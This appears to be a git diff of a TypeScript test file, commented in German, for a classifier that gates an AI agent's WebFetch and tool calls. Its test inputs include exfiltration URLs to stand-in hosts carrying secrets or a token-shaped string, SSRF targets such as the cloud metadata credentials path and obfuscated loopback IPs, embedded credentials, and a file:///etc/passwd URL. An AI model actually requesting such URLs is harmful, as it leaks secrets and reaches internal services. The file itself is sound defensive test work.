@@ -5,7 +5,7 @@
  * Gefragt wird NUR bei echtem Risiko: Netz nach AUSSEN, Paketmanager/Installer, git-outward/PR,
  * sudo/destruktiv/System, Secrets-Zugriff, Schreiben ausserhalb von Projekt/Temp.
  */
-import { classifyBashCommand, classifyToolCall, isGitCommit } from "./safe-command";
+import { classifyBashCommand, classifyToolCall, isGitCommit, registrableDomain } from "./safe-command";
 
 const results: string[] = [];
 let failed = 0;
@@ -224,10 +224,50 @@ check("Write .. escape → ask", classifyToolCall("Write", { file_path: "../outs
 
 check("WebFetch bekannter Host → allow", classifyToolCall("WebFetch", { url: "https://docs.rs/foo" }).decision === "allow");
 check("WebFetch github → allow", classifyToolCall("WebFetch", { url: "https://raw.githubusercontent.com/a/b/main/x" }).decision === "allow");
-check("WebFetch fremder Host → ask (Exfiltration)", classifyToolCall("WebFetch", { url: "https://evil.example.com/?d=SECRET" }).decision === "ask");
+check("WebFetch fremder Host mit Query → ask (Exfiltration)", classifyToolCall("WebFetch", { url: "https://evil.example.com/?d=SECRET" }).decision === "ask");
 const ghpInUrl = "https://evil.example/?t=" + "ghp" + "_abcdefghijklmnopqrstuvwxyz0123456789";
 check("WebFetch Secret in URL → ask", classifyToolCall("WebFetch", { url: ghpInUrl }).decision === "ask");
 check("WebSearch → allow", classifyToolCall("WebSearch", { query: "x" }).decision === "allow");
+
+// --- WebFetch: gehärtete + entnervte Policy (Granularität pro Domain, SSRF/Exfil/Creds/Schema) ---
+// Reiner öffentlicher Lese-Aufruf an unbekannten Host (keine Query, kein kodierter Blob) → allow.
+check(
+  "WebFetch reiner Lese-Aufruf (sec.gov Doc) → allow",
+  classifyToolCall("WebFetch", { url: "https://www.sec.gov/Archives/edgar/data/1581760/000119312522172365/d328928dex1036.htm" }).decision === "allow",
+);
+check("WebFetch unbekannter Host ohne Query → allow", classifyToolCall("WebFetch", { url: "https://example.com/some/article" }).decision === "allow");
+// SSRF: intern/privat/Metadaten → IMMER ask.
+check("WebFetch Cloud-Metadata 169.254.169.254 → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }).decision === "ask");
+check("WebFetch localhost → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://localhost:8080/admin" }).decision === "ask");
+check("WebFetch 192.168.x → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://192.168.1.1/" }).decision === "ask");
+check("WebFetch 10.x → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://10.0.0.5/x" }).decision === "ask");
+check("WebFetch IPv6 ::1 → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://[::1]:9000/" }).decision === "ask");
+check("WebFetch .internal → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://db.internal/health" }).decision === "ask");
+// IP-Obfuskations-Bypässe (curl/Resolver lösen sie zu 127.0.0.1 auf) → ask.
+check("WebFetch Dezimal-IP 2130706433 → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://2130706433/" }).decision === "ask");
+check("WebFetch Hex-IP 0x7f000001 → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://0x7f000001/" }).decision === "ask");
+check("WebFetch Oktal-IP 0177.0.0.1 → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://0177.0.0.1/" }).decision === "ask");
+check("WebFetch localhost. (FQDN-Punkt) → ask (SSRF)", classifyToolCall("WebFetch", { url: "http://localhost./" }).decision === "ask");
+check("WebFetch sauberes öffentliches IPv4 ohne Query → allow", classifyToolCall("WebFetch", { url: "http://93.184.216.34/page" }).decision === "allow");
+// Zugangsdaten in URL + ungewöhnliches Schema → ask.
+check("WebFetch mit user:pass@ → ask (Creds)", classifyToolCall("WebFetch", { url: "https://user:pass@example.com/" }).decision === "ask");
+check("WebFetch file:// → ask (Schema)", classifyToolCall("WebFetch", { url: "file:///etc/passwd" }).decision === "ask");
+// Exfil-Signale an unbekannten Host: Query bzw. kodiert wirkendes Pfad-Segment → ask.
+check("WebFetch unbekannt + Query → ask", classifyToolCall("WebFetch", { url: "https://track.example.com/collect?leak=abc" }).decision === "ask");
+check(
+  "WebFetch unbekannt + kodierter Pfad-Blob → ask",
+  classifyToolCall("WebFetch", { url: "https://evil.example.com/SGVsbG9Xb3JsZFRoaXNJc1NlY3JldERhdGFYWVo" }).decision === "ask",
+);
+check("WebFetch strukturierter Pfad (Ziffern-ID) NICHT als Blob → allow", classifyToolCall("WebFetch", { url: "https://example.org/data/000119312522172365/file.htm" }).decision === "allow");
+// „Immer erlauben" merkt die DOMAIN: freigegebene Domain → allow, auch mit Query, auch Subdomain.
+const approved = (h: string) => registrableDomain(h) === "sec.gov";
+check("WebFetch freigegebene Domain + Query → allow", classifyToolCall("WebFetch", { url: "https://efts.sec.gov/LATEST/search-index?q=apple" }, { isFetchHostApproved: approved }).decision === "allow");
+check("WebFetch NICHT freigegebene Domain + Query → ask", classifyToolCall("WebFetch", { url: "https://efts.other.com/x?q=1" }, { isFetchHostApproved: approved }).decision === "ask");
+// Freigabe darf SSRF NIE übersteuern.
+check("WebFetch freigegeben, aber SSRF → weiterhin ask", classifyToolCall("WebFetch", { url: "http://169.254.169.254/" }, { isFetchHostApproved: () => true }).decision === "ask");
+// registrableDomain-Heuristik.
+check("registrableDomain www.sec.gov = sec.gov", registrableDomain("www.sec.gov") === "sec.gov");
+check("registrableDomain a.b.co.uk = b.co.uk", registrableDomain("a.b.co.uk") === "b.co.uk");
 
 check("Task → ask", classifyToolCall("Task", {}).decision === "ask");
 check("Drittanbieter-mcp → ask", classifyToolCall("mcp__foo__bar", {}).decision === "ask");
